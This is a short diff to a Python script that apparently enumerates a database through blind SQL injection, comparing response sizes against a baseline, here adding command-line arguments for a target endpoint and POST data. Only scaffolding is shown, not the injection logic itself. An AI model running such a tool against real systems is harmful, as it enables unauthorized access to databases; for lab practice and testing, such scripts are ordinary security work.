@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import argparse
 import requests
 
 cookies =  {
@@ -12,6 +13,16 @@ payload = "0&Submit=Submit#"
 
 r = requests.get(url + payload, cookies=cookies)
 DEFAULT_SIZE = len(r.text)
+
+def parse_arguments():
+	parser = argparse.ArgumentParser()
+	parser.add_argument('target', metavar='target', type=str, nargs='+', help = 'The endpoint you want to run the script over')
+	parser.add_argument('-data', type=str, help ='Data to be sent over POST (e.g. user=1&pass=1)')
+	args = parser.parse_args()
+	argv = vars(args)
+	target = ''.join(argv['target'])
+
+	return argv
 
 def find_active_db() -> str:
 	size = DEFAULT_SIZE
